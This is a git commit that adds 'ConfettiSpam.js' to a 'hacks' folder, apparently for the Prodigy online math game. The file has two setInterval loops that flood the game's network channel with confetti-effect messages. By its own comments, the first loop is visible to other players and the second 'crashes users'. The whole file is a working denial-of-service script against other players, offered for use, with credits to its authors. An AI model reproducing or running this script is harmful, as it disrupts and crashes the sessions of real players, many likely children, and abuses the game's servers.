9c17f75952362fb6bea89d9b836c55d0a372284d
DaChickenKing <61570792+DaChickenKing@users.noreply.github.com>
2020-03-25 06:16:31 -0700

    Create ConfettiSpam.js

---
+++ hacks/ConfettiSpam.js
@@ -0,0 +1,13 @@
+//Small spam. Doesn't crash users:
+setInterval(function(){
+PIXI.game.prodigy.network.emitMessage({action:"fx",data:{type:1, userID: PIXI.game.prodigy.player.userID}})
+},10); //THIS SCRIPT DOES APPEAR FOR OTHERS
+
+//Large spam. Crashes users:
+setInterval(()=>PIXI.game.prodigy.network.emitMessage({"action":"fx","data":{"type":3,"userID":PIXI.game.prodigy.player.userID,"x":Math.floor(Math.random() * 1280),"y":Math.floor(Math.random() * 720)}}));
+
+
+
+/*CREDIT*/
+/**/DaChickenKing | Did research on the SocketInterface in the Discord Server
+/**/TNTHacker2015 | Made script
